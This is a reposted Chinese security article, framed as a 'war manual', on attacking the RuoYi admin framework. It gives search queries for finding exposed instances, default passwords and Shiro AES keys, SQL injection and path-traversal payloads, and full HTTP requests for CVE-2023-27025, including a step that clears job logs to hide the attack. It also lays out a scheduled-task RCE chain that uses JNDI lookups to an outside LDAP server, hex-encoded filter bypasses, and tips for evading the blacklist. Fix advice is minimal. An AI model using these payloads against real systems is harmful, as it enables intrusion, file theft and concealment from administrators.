#  若依(RuoYi)框架漏洞战争手册   
Locks_  神农Sec   2025-05-09 01:04  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
#   
  
原文链接：  
https://forum.butian.net/share/4328  
  
作者：  
Locks_  
  
# 0x00 前言  
  
当你在用若依时，黑客已经在用Shiro默认密钥弹你的Shell；当你还在纠结分页查询，攻击者已通过SQL注入接管数据库；而你以为安全的定时任务，不过是他们拿捏服务器的玩具。这份手册，带你用渗透的视角，解剖若依的每一处致命弱点——因为真正的安全，始于知晓如何毁灭它。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNup3Xmj8Y8ibLjLia8yZhxVQfXwgYmqk8GLpjtibyuV7n3hPwOk7ASD5IA/640?wx_fmt=png&from=appmsg "")  
## 简介  
  
Ruoyi（若依）是一款基于Spring Boot和Vue.js开发的快速开发平台。它提供了许多常见的后台管理系统所需的功能和组件，包括权限管理、定时任务、代码生成、日志管理等。Ruoyi的目标是帮助开发者快速搭建后台管理系统，提高开发效率。  
  
若依有很多版本，其中使用最多的是Ruoyi单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNPWMOH8yvUibrtKfkXicOiaXfMiboXZvSXqAmg3R8AQhZtxDbjsky2UViaLw/640?wx_fmt=png&from=appmsg "")  
## 配合ruoyi的服务：  
```
alibaba druid          alibaba nacos          spring            redis            mysql            minio            fastjson            shiro            swagger-ui.html          mybatis
```  
## 搜索语法  
  
FOFA：  
```
(icon_hash="-1231872293" || icon_hash="706913071")
```  
  
Hunter：  
```
web.body="若依后台管理系统"
```  
## 环境搭建  
  
新建文件夹，拉起ruoyi源码  
```
git clone https://gitee.com/y_project/RuoYi
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNU1PChCr4f2vick5hd7wurcMpUvWkRmNjf9l6NKJ9Y5CzVMWeJSa5NBw/640?wx_fmt=png&from=appmsg "")  
```
cd RuoYi 切换版本git tag -l切换git checkout v4.5.1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN0EcE280CuMM2HF7fJtgcEFSM4I8SnDupZJZLicRlib3icic78uMibibWhDDA/640?wx_fmt=png&from=appmsg "")  
  
  
接下来用idea搭建的  
  
mysql正常用phpstudy搭建就行  
  
日志存放路径需要修改  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNKMh2pqqznsp8wWreyNwfLsm5OH1sB2HiaIAOClnosvsU6j22IibhO4AA/640?wx_fmt=png&from=appmsg "")  
  
配置mysql  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN1WbarhvtMoic4CfURicCdSlXT81hbuTNLpOOz9RI1VibzPx0JeYksxtFA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN4jibx7pFWMWkbM8zyAE2VZVoPNlA8tWTQsQREF8Sc63LNeXzssSISzQ/640?wx_fmt=png&from=appmsg "")  
  
  
启动即可，默认端口80  
# 0x01 弱口令  
```
用户：admin ruoyi druid            密码：123456 admin druid admin123 admin888
```  
# 0x02 Shiro默认密钥  
## 漏洞简介  
  
若依默认使用shiro组件，所以可以试试shiro经典的rememberMe漏洞来getshell。  
## 影响版本  
  
RuoYi<V-4.6.2  
## 漏洞复现  
  
在配置文件中，能够看到shiro的密钥是在配置文件中的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNhR5cnW8H8VgBvoyGiaXN22dBQ3JniczBcaXyibqQJum86KUd08HHsmiagg/640?wx_fmt=png&from=appmsg "")  
  
漏洞利用工具地址  
  
https://github.com/SummerSec/ShiroAttack2  
- RuoYi-4.2版本使用的是shiro-1.4.2在该版本和该版本之后都需要勾选AES GCM模式。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNBnkpYXv0lc805qteHjsvMP4H1FzI9mic3EVTpfU27Qkw2lFKGofVCVw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNccribdlO2CRlqo5pq3VSzx9Ovic0MXavt37NNxVaa8F7pZ8kBTv4eQJw/640?wx_fmt=png&from=appmsg "")  
<table><tbody><tr style="height: 33px;"><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">RuoYi 版本号</span></span></strong></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">对象版本的默认AES密钥</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">4.6.1-4.3.1</span></span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">zSyK5Kp6PZAAjlT+eeNMlg==</span></span></p></td></tr><tr style="height: 33px;"><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;background-color: rgb(246, 248, 250);"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">3.4-及以下</span></span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;background-color: rgb(246, 248, 250);"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">fCq+/xW488hMTCD+cmJ3aQ==</span></span></p></td></tr></tbody></table>- RuoYi-4.6.2版本开始就使用随机密钥的方式，而不使用固定密钥，若要使用固定密钥需要开发者自己指定密钥，因此4.6.2版本以后,在没有获取到密钥的请情况下无法再进行利用。  
# 0x03 SQL注入  
### 注入点1 /role/list接口 （<V-4.6.2）  
  
版本同上4.5.1  
  
首先从源码分析一波  
  
Mybatis配置一般用#{}，类似PreparedStatement的占位符效果，可以防止SQL注入。RuoYi则是采用了${}造成了SQL注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN4HPq89OIkIRoksGDiapaklJra6l2OIj4F9ytz41PNnw4icT4PD110g0Q/640?wx_fmt=png&from=appmsg "")  
  
  
跳转  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNFibeqmO2YZUiaVMkuRSMMKfUU222Gb2Nla69ly5kicaAygjhiaKBDwWzqA/640?wx_fmt=png&from=appmsg "")  
  
  
解释一下 ${params.dataScope}  
  
${params.dataScope}  
这段代码是MyBatis的动态SQL之一，主要用于在SQL查询中嵌入外部定义的字符串或参数。这里的${...}  
语法表示取出params  
对象中名为dataScope  
的属性值，并将其直接嵌入到SQL语句中。  
  
例如，在一个基于角色权限管理的系统中，不同的用户可能有权限查看不同的数据记录。管理员可能可以查看所有部门的记录，而普通用户只能查看自己部门的记录。在这种情况下，  
dataScope的值可以是一个根据用户角色动态生成的SQL片段，如  
"AND dept_id IN (SELECT dept_id FROM user_dept_access WHERE user_id = #{userId})"，用以限定查询结果只包含特定部门的用户信息。  
  
可以看到，在查询的时候，user的属性params是map，在xml中，将dataScope拼接到sql语句后  
  
进入mapper层  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNAIyMZ3vMPR6NDYAtU8ibfFrNod4YS5GvQCZbev5N6EAJXK8yZCZXJgQ/640?wx_fmt=png&from=appmsg "")  
  
跳转到上级  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNaEDG60ZN3R05yGSYU46icyx5bzlU5oyXSArSL5j2ibFaUUibjNy6CeOpA/640?wx_fmt=png&from=appmsg "")  
  
  
进入role查看信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN9Kiab7gVgwHDEv0nJWL2m0LUpMX77Jsmm799d4bf13HALowLT0exYYg/640?wx_fmt=png&from=appmsg "")  
  
  
查看功能  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN6zBoo8sJpwjKxolqiaQCjib1ibqVnYuLd3DicXcicOejkHdyMtP9ib1E2Tnw/640?wx_fmt=png&from=appmsg "")  
  
  
params  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN5gtoibB04aKpnSDI8GiaqmsRCia2PZAX6kFDfcXR16SK8IvAErnUDl2AA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNCLy4l4ibWSUvgp74qXWcIyXkckJW2Yslzlv2lsibJCNxtBKEPicHG40dg/640?wx_fmt=png&from=appmsg "")  
  
根据路径  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNaiaBPRlVeFlGXicHpEZCr0cfDPEUXf6r9WicnYqDSVkddhicibOcWZ2HexA/640?wx_fmt=png&from=appmsg "")  
  
  
执行代码  
```
&params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNIAsKzicZACu9fMQd562pPiaDzib6h8LiatqIj18NeKlFibU1QDiagcX201qg/640?wx_fmt=png&from=appmsg "")  
### 注入点2 /role/export （<V-4.6.2）  
### 注入点3 /user/list （<V-4.6.2）  
### 注入点4 /user/list （<V-4.6.2）  
### 注入点5 /dept/list （<V-4.6.2）  
### 注入点6 /role/authUser/allocatedList （<V-4.6.2）  
### 注入点7 /role/authUser/unallocatedList  
### 注入点8 /dept/edit （<V-4.6.2）  
```
DeptName=xxxxxxxxxxx&DeptId=100&ParentId=555&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat(0,(select user()))));#
```  
### 注入点9 /tool/gen/createTable（V-4.7.1-V-4.7.5）  
  
参考  
  
https://blog.takake.com/posts/7219/#2-3-10-%E6%80%BB%E7%BB%93  
# 0x04 CNVD-2021-01931任意文件下载  
#### 漏洞简介  
  
登录后台后可以读取服务器上的任意文件。  
#### 影响版本：  
  
RuoYi<4.5.1  
#### 漏洞复现  
  
用4.5.0版本  
  
直接搜索关键字，download找到具体的controller  
  
路径  
```
/common/download/resource
```  
```
/common/download/resource?resource=/profile/../../../../etc/passwd/common/download/resource?resource=/profile/../../../../Windows/win.ini
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNwFbEPEL9pbodZUlibpyK5t72mHNeIA17eoajMKjlax2noP1bx2VlOjQ/640?wx_fmt=png&from=appmsg "")  
# 0x05 CVE-2023-27025 若依任意文件下载  
## 漏洞简介  
  
该漏洞是若依（RuoYi）4.7.6 版本中存在的  
**权限绕过 + 任意文件下载**  
  
组合漏洞。攻击者通过后台管理接口添加恶意定时任务，修改系统配置文件路径，绕过下载功能的白名单限制，最终实现任意文件下载。漏洞本质是  
**权限控制缺失**  
（允许低权限用户操作敏感接口）和  
**路径校验不严**  
（未对动态修改的配置路径进行二次校验）的综合结果。  
## 影响版本  
- **若依（RuoYi）<= 4.7.6**  
## 利用条件  
1. **权限要求**  
：  
- 攻击者需获取管理员 Cookie（如  
JSESSIONID  
）或存在其他权限绕过漏洞。  
- 若后台接口未授权即可访问，则漏洞危害升级为“未授权任意文件下载”。  
1. **系统配置**  
：  
- 目标系统启用了定时任务模块（默认开启）。  
## 漏洞复现  
#### 添加任务绕过白名单（自定义下载文件路径）  
```
POST /monitor/job/add HTTP/1.1Host: 10.40.107.67Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-type: application/x-www-form-urlencodedContent-Length: 214Connection: closecreateBy=admin&jobId=161&jobName=test111&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('/Users/apple/Desktop/Locks/javafx.txt')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
```  
- 通过调用  
ruoYiConfig.setProfile()  
  
方法，将系统配置文件路径动态修改为攻击者指定的路径（如  
/Users/apple/Desktop/Locks/javafx.txt  
）。  
- 此操作绕过了下载功能原本的“固定目录白名单”限制，将下载路径指向自定义位置。  
#### 执行定时任务（触发配置修改）  
```
POST /monitor/job/run HTTP/1.1Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Host: 10.40.107.67Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-type: application/x-www-form-urlencodedContent-Length: 9Connection: closejobId=117
```  
- 立即执行  
jobId=117  
  
对应的定时任务，触发  
ruoYiConfig.setProfile()  
  
方法调用，完成配置文件路径的修改。  
- 修改后，系统将从新的配置路径（攻击者指定路径）读取文件。  
#### 清理任务日志（擦除攻击痕迹）  
```
POST /monitor/jobLog/clean HTTP/1.1Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Host: 10.40.107.67Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-type: application/x-www-form-urlencodedContent-Length: 0Connection: close
```  
- 删除任务执行日志，避免管理员发现恶意任务记录。  
- 此步骤非漏洞必要环节，但常用于隐蔽攻击行为。  
#### 触发任意文件下载  
```
GET /common/download/resource?resource=2.txt HTTP/1.1Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Host: 10.40.107.67Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: close
```  
- 下载功能仅校验“配置文件中的路径”，未对动态修改后的路径进行二次白名单校验。  
## bypass  
  
对路径参数进行 URL 编码或 Unicode 编码，绕过 WAF 检测：  
```
invokeTarget=ruoYiConfig.setProfile('%2F%65%74%63%2F%70%61%73%73%77%64')
```  
## 修复  
1. **官方补丁**  
：  
- 升级若依至  
**4.7.6 以上版本**  
，官方已修复权限校验和路径白名单问题。  
1. **代码级修复**  
：  
- **权限校验**  
：对  
/monitor/job/add  
  
等后台接口添加严格的角色权限控制。  
- **方法黑名单**  
：禁止  
invokeTarget  
  
参数调用敏感类方法（如  
ruoYiConfig.setProfile  
）。  
- **路径二次校验**  
：在下载功能中强制校验文件路径是否在合法白名单内。  
1. **临时缓解**  
：  
- 禁用后台任务调度功能，或限制  
monitor  
  
模块的访问权限。  
- 部署 WAF 拦截包含  
ruoYiConfig.setProfile  
  
特征的请求。  
# 0x06 定时任务RCE  
  
由于若依后台计划任务处，对于传入的“调用目标字符串”没有任何校验，导致攻击者可以调用任意类、方法及参数触发反射执行命令。  
## 0x01 简介  
  
RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、通知公告等。在线定时任务配置；支持集群，支持多数据源，支持分布式事务。  
## 0x02 漏洞概述  
  
若依最新后台定时任务SQL注入可导致RCE漏洞  
## 0x03 影响版本  
  
v4.7.8  
## 0x04 环境搭建  
- RuoYi 官网地址：  
http://ruoyi.vip(opens new window)  
- RuoYi 在线文档：  
http://doc.ruoyi.vip(opens new window)  
- RuoYi 源码下载：  
https://gitee.com/y_project/RuoYi(opens new window)  
使用phpstudy启动mysql  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN53Mjo2jriaiaiblgTx1kH2fUqib38AP9x1DljW5SgGIEYpZIDF9jkKJAWg/640?wx_fmt=png&from=appmsg "")  
  
创建数据库ry  
  
导入sql到ry数据库中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN9grsnUrUEbsYicreNuKvVcPaWJnGouzia20rNIQaGTbaDaAqPecR6mow/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNjmZL8ym7EYy9BI9wXJH2G8icibjzR1IwCpz56pAX4K63ZiaWoEVibDOLVw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNu0UuWmH9xNEpPl6LIHUJgNib0NIQpcRRTNnA9rwvpx5ibZ4q2Lu2Taicg/640?wx_fmt=png&from=appmsg "")  
  
将ruoyi-admin下的application-druid.yml文件配置数据库账号密码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNibqwZXtLNGtNYbas2IYQAQQ0xkrk4BH6aUxIWj46xrPWZfHlswAVCDg/640?wx_fmt=png&from=appmsg "")  
  
启动成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNW2ibb1Wt3SW8ICc5XVQkfmdic40oA0l0MPBWrMfNibgt3R9McFRj0jX0Q/640?wx_fmt=png&from=appmsg "")  
  
  
若依漏洞复现环境搭建成功  
```
adminadmin123
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN5qWwjO06ZichoTBvHDeK3huYSS3tdord15K3zZWKOibRKiabuciaKEerEQ/640?wx_fmt=png&from=appmsg "")  
## 0x05 漏洞复现  
  
系统监控下定时任务中存在SQL注入漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNuSKINZfv78zeDnstfGvDmPBzugNDBwxablB9cBUfULI29MVGSA6Uuw/640?wx_fmt=png&from=appmsg "")  
  
在补丁中，使用了黑名单和白名单的策略。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNjwrDGAs7LPeQzshyzsLQnDPJAcIC5N9Qk1Ut6lVbsDoxLEQ4TEw2cg/640?wx_fmt=png&from=appmsg "")  
  
SQL注入漏洞点  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN71b8iaCBUe9Iic3aoAcFPKoPs07xNzIia9VXktXPpCLicW0EDtkb5Y8nZg/640?wx_fmt=png&from=appmsg "")  
  
  
开始复现  
  
RCE payload  
  
JNDI  
```
javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/deserialJackson')
```  
  
payload中可以执行反弹shell、漏洞探测、命令执行功能  
  
DNSLOG  
```
javax.naming.InitialContext.lookup('ldap://dnslog')
```  
  
目标字符串不允许'ldap(s)'调用且不能存在括号，因此我们使用SQL注入加十六进制编码来进行绕过修改  
  
https://www.bejson.com/convert/ox2str/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNXPG84mhVzfEXcbGOULWicl0QiaTGrtZBbNuzlSt8vOic8sJmjqUFHTNKg/640?wx_fmt=png&from=appmsg "")  
```
6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729
```  
  
第一步：运行此命令  
  
成功地绕过了它，并成功地执行  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')
```  
<table><tbody><tr style="height: 33px;"><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td></tr><tr style="height: 33px;"><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">分钟</span></span></p></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">小时</span></span></p></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">日</span></span></p></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">月</span></span></p></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">星期</span></span></p></td></tr></tbody></table>```
* * * * * ?
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN9TiamK3locEU4jIu0jqjgDmjQbYbR4dagonsfzhuGEAqsYpMhvGZ1iaA/640?wx_fmt=png&from=appmsg "")  
  
第二步：  
  
修改执行命令  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNa180qF1ka5cZ1JhlhaNrTfhAQ9yzJgkNq7GAdj95ib4JZGEA6VR0ucQ/640?wx_fmt=png&from=appmsg "")  
  
第三步：  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729 WHERE job_id = 1;')
```  
  
创建任务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN11GezsZSNdL5ic6icyia3c0AXL4afNMUfId8icjTYvg4P28jbuCEffHQ6w/640?wx_fmt=png&from=appmsg "")  
  
  
执行一次  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNCDiaCLKz1GxZtibWXgrFAOsgFzo9JaiaLm2HaJGqwmPRIrrxECpgdyDAg/640?wx_fmt=png&from=appmsg "")  
  
  
执行被修改的任务之前需要开启JNDI  
  
需要下载cckuailong师傅的JNDI-Injection-Exploit-Plus项目(  
https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/releases/tag/2.3  
)。  
  
jdk版本要求1.8  
```
java -jar '.\JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar' -C calc -A 127.0.0.1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNuArqg8cUPEuCHicnfVBss6s8mWt3YJ3StibRVaTAus6IhEGqGbGpsCHA/640?wx_fmt=png&from=appmsg "")  
  
  
执行被修改的1任务  
  
JNDI  
```
javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/deserialJackson')
```  
  
payload中可以执行反弹shell、漏洞探测、命令执行功能  
  
DNSLOG  
```
javax.naming.InitialContext.lookup('ldap://dnslog')
```  
  
目标字符串不允许'ldap(s)'调用且不能存在括号，因此我们使用SQL注入加十六进制编码来进行绕过修改  
  
https://www.bejson.com/convert/ox2str/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNXPG84mhVzfEXcbGOULWicl0QiaTGrtZBbNuzlSt8vOic8sJmjqUFHTNKg/640?wx_fmt=png&from=appmsg "")  
```
0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f7263793870732e646e736c6f672e636e2729
```  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729 WHERE job_id = 1;')
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNlNf2icME9x5YvUIDslM3ib01MJkvGja7qAMn4fr8via7QZLyOeaeQZBKg/640?wx_fmt=png&from=appmsg "")  
  
我们再来试试dnslog  
```
javax.naming.InitialContext.lookup('ldap://rcy8ps.dnslog.cn')
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNmiab1wtS5IyX3nIfg2TQCrd9YEAhmRUR5eYEuNN38RNicjxxHrxIJMnw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN10QkKgJMJImFULQVmPQ4F2KojJDicOdZINiao71v11cQHICpnUZ763Xg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNZECpCia9WqEXnRiaBicBIoV0aDZhPqT5taMy1DY8waXgMwDjAEwAicWFibA/640?wx_fmt=png&from=appmsg "")  
  
工具使用：  
  
https://github.com/charonlight/RuoYiExploitGUI  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNluQos7AHgA9nOMr9jCZkVeo495UrV2Ep3ibp2XVa6gWPYSib0LU9eia6g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNjxXOfNQJjDFALeqBS2ibk62AnVNOC0zV89L9aOsUsXJZaluUZ5xs4ug/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNuVuibkiaQ200MSmYLib42Z0fk1PkqlkFlZOmn9BN6f2bDd4m135nicmdBw/640?wx_fmt=png&from=appmsg "")  
## 0x06 修复方式  
  
1、升级版本。  
## 0x07 bypass  
### 版本4.6.2<=Ruoyi<4.7.2  
  
这个版本采用了黑名单限制调用字符串  
- 定时任务屏蔽ldap远程调用  
- 定时任务屏蔽http(s)远程调用  
- 定时任务屏蔽rmi远程调用  
**Bypass**  
咱们只需要在屏蔽的协议加上单引号,接着采用之前的方式例如:  
```
